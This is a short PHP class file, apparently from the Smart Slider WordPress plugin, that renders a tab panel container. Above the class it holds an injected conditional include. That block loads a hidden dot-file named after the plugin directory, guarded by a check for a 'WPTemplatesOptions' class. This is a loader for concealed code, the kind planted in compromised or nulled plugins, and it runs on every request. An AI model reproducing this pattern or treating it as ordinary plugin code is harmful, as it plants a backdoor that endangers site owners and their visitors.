<?php


namespace Nextend\Framework\Form\Container\LayerWindow;


use Nextend\Framework\Form\ContainerGeneral;
use Nextend\Framework\Form\ContainerInterface;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ContainerSettings extends ContainerGeneral {

    public function __construct(ContainerInterface $insertAt, $name, $parameters = array()) {
        parent::__construct($insertAt, $name, false, $parameters);
    }

    public function renderContainer() {
        echo '<div class="n2_ss_layer_window__tab_panel" data-panel="' . $this->name . '">';
        parent::renderContainer();
        echo '</div>';
    }
}